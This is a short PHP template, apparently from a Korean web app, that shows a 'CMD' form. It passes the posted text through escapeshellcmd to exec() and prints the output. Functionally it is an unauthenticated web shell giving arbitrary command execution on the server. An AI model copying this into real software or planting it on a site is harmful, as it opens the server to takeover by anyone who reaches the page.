<form method="post" action="index.php?cmd=shell2">
<div class="row">
    <div class="col-3 col-md-2 colLine">CMD</div>
    <div class="col-6 col-md-8 colLine">
        <input type="text" class="form-control" name="command">
    </div>
    <div class="col colLine">
        <button type="submit" class="btn btn-primary">실행</button>
    </div>
</div>
</form>

<!-- 
    netstat -an 
 -->
<div class="row">
    <div class="col colLine">
        <pre>
        <?php 
            if(isset($_POST["command"]))
            {
                // 한글깨짐을 제어하기 위해
                // 실행 전에 출력버퍼의 인코딩을 설정
                header('Content-Type: text/html; charset=UTF-8');
                $output = [];
                $command = escapeshellcmd($_POST["command"]);
                exec($command, $output);
                foreach($output as $line)
                {
                    echo htmlspecialchars(mb_convert_encoding($line, 'UTF-8', 'CP949')) . "\n";
                }
            }
        ?>
        </pre>
    </div>
</div>